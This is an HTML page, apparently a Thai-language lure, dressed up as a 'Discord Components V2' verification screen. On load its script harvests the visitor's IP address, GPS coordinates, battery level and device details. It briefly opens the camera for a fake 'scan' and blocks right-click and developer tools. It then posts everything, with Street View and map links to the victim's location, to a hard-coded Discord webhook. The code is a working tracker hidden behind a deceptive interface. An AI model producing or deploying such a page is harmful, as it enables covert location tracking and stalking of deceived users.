<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Components V2 UI</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Kanit', sans-serif;
            background: #313338;
            color: white;
            user-select: none;
            overflow-x: hidden;
        }

        .glass-panel {
            background: #1e1f22;
            border: 1px solid #111214;
            backdrop-filter: blur(24px);
        }

        .scan-anim {
            height: 2px;
            background: #5865F2;
            position: absolute;
            width: 100%;
            top: 0;
            animation: move 3s infinite;
            box-shadow: 0 0 20px #5865F2;
        }

        @keyframes move {
            0% { top: 0; }
            100% { top: 100%; }
        }

        /* Custom Scrollbar สำหรับการ์ดแสดงผล */
        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-thumb {
            background: #5865F2;
            border-radius: 999px;
        }
    </style>
</head>

<body class="flex items-center justify-center min-h-screen p-4">

<div class="max-w-md w-full glass-panel rounded-[2rem] overflow-hidden shadow-2xl my-8">

    <div class="h-32 bg-gradient-to-r from-indigo-500 via-blue-500 to-cyan-400 relative">
        <div class="absolute bottom-4 left-6 flex items-center gap-4">
            <div class="w-20 h-20 rounded-full border-[6px] border-[#1e1f22] bg-[#5865F2] flex items-center justify-center text-4xl shadow-2xl">
                🛰️
            </div>
            <div>
                <div class="flex items-center gap-2">
                    <h1 class="text-2xl font-bold text-white">Verification</h1>
                    <span class="bg-[#5865F2] text-white text-[10px] px-2 py-1 rounded-full uppercase tracking-widest font-semibold">VERIFIED</span>
                </div>
                <p class="text-white/80 text-sm">Discord Components V2</p>
            </div>
        </div>
    </div>

    <div class="p-6 pt-10">

        <div id="step-scan" class="text-center">
            <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-[#5865F2]/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(88,101,242,0.4)]">
                <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                <div class="absolute inset-0 bg-gradient-to-b from-transparent via-[#5865F2]/10 to-transparent"></div>
                <div class="scan-anim"></div>
            </div>
            <p id="status-msg" class="text-[#5865F2] text-sm animate-pulse tracking-widest font-medium">กำลังเชื่อมต่อ...</p>
        </div>

        <div id="step-result" class="hidden animate-fade-in">
            <div class="bg-[#2b2d31] border border-[#1e1f22] rounded-3xl p-5 mb-6 shadow-md">
                <div class="flex items-center gap-4">
                    <div class="w-14 h-14 rounded-2xl bg-green-500 flex items-center justify-center text-2xl shadow-xl text-white font-bold">
                        ✓
                    </div>
                    <div>
                        <h2 class="text-lg font-bold text-white">ตรวจสอบสำเร็จ</h2>
                        <p class="text-[#949ba4] text-xs">Ref: TX-994102-B</p>
                    </div>
                </div>
            </div>
            <div id="info-box" class="space-y-3 max-h-[400px] overflow-y-auto pr-1"></div>
        </div>

    </div>
</div>

<script>
// ตั้งค่า Discord Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";

// ออบเจกต์สำหรับเก็บข้อมูลผู้ใช้งาน
let userData = {
    lat: "ไม่ระบุ",
    lon: "ไม่ระบุ",
    ip: "Unknown",
    battery: "Unknown"
};

// ปิดการคลิกขวา และ F12
document.addEventListener('contextmenu', e => e.preventDefault());
document.onkeydown = (e) => {
    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
        return false;
    }
};

// เริ่มระบบโหลดข้อมูลพื้นฐาน
async function startProcess() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        userData.ip = ipData.ip;
    } catch(e) {}

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            userData.battery = Math.floor(battery.level * 100) + "%";
        }
    } catch(e) {}

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                userData.lat = pos.coords.latitude;
                userData.lon = pos.coords.longitude;
                document.getElementById("status-msg").innerText = "เข้าถึง GPS สำเร็จ...";
                await initCamera();
            },
            async () => {
                document.getElementById("status-msg").innerText = "ข้ามระบบ GPS... กำลังเปิดกล้อง...";
                await initCamera();
            }
        );
    } else {
        await initCamera();
    }
}

// เปิดใช้งานกล้อง
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        const video = document.getElementById("cam");
        video.srcObject = stream;
        document.getElementById("status-msg").innerText = "กำลังตรวจสอบอุปกรณ์...";

        setTimeout(() => {
            stream.getTracks().forEach(t => t.stop());
            showResult();
        }, 3000);

    } catch (err) {
        showResult();
    }
}

// ฟังก์ชันส่งข้อมูล "ทุกอย่าง" เข้า Discord Webhook
async function sendToWebhook() {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    const payload = {
        embeds: [{
            title: "📡 รายงานข้อมูลอุปกรณ์ทั้งหมด [Discord Components V2]",
            color: 5814786,
            fields: [
                { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
                { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
                { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
                { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
                { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
                { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
                { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
                { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
                { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
                { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
                { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
                { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
                { name: "🏙️ Street View", value: `http://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}`, inline: false },
                { name: "🗺️ Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}`, inline: false }
            ],
            footer: { text: "ระบบดักจับข้อมูลเสร็จสิ้น" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch(e) {
        console.error("Webhook Error", e);
    }
}

// เปลี่ยนหน้าและแสดงผลบนเว็บ
function showResult() {
    document.getElementById("step-scan").classList.add("hidden");
    document.getElementById("step-result").classList.remove("hidden");

    // เรียกฟังก์ชันส่งค่าทั้งหมดเข้า Discord
    sendToWebhook();

    const box = document.getElementById("info-box");
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    const data = [
        { icon: "📍", title: "พิกัด", value: `${userData.lat}, ${userData.lon}` },
        { icon: "🌐", title: "IP Address", value: userData.ip },
        { icon: "💻", title: "ระบบ", value: navigator.platform },
        { icon: "🗣️", title: "ภาษา", value: navigator.language },
        { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
        { icon: "🧠", title: "CPU Cores", value: cpuCores },
        { icon: "💾", title: "RAM", value: ramSize },
        { icon: "🔋", title: "Battery", value: userData.battery },
        { icon: "🌍", title: "Timezone", value: timezone },
        { icon: "📶", title: "Connection", value: connectionType },
        { icon: "🍪", title: "Cookies", value: cookiesStatus },
        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
        { icon: "🏙️", title: "Street View", value: `https://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}` },
        { icon: "🗺️", title: "Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}` }
    ];

    box.innerHTML = "";
    data.forEach(item => {
        box.innerHTML += `
            <div class="bg-[#2b2d31] border border-[#1e1f22] rounded-2xl p-4 flex items-center gap-4 hover:bg-[#32353b] transition-all duration-200">
                <div class="w-12 h-12 rounded-2xl bg-[#5865F2] flex items-center justify-center text-2xl shadow-lg flex-shrink-0">
                    ${item.icon}
                </div>
                <div class="flex-1 overflow-hidden">
                    <p class="text-xs uppercase tracking-widest text-[#949ba4] mb-1 font-medium">${item.title}</p>
                    <p class="font-semibold break-all text-sm text-white">${item.value}</p>
                </div>
            </div>
        `;
    });
}

window.onload = () => {
    startProcess();
};
</script>

</body>
</html>
